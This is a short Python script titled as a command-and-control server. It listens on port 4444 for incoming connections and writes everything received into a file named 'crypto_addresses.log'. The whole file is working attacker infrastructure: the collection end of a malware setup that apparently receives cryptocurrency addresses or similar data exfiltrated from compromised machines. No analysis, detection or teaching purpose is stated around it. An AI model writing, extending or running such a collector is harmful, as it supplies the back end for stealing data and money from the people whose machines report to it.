# C2_Server.py
import socket
import threading

# Server configuration
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444        # Port to listen on

# Function to handle client connections
def handle_client(client_socket):
    try:
        while True:
            # Receive data from the client
            data = client_socket.recv(1024).decode('utf-8')
            if not data:
                break
            print(f"[*] Received from client: {data}")

            # Log the received data to a file
            with open('crypto_addresses.log', 'a') as f:
                f.write(f"{data}\n")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        client_socket.close()

# Main server function
def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Listening on {HOST}:{PORT}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    start_server()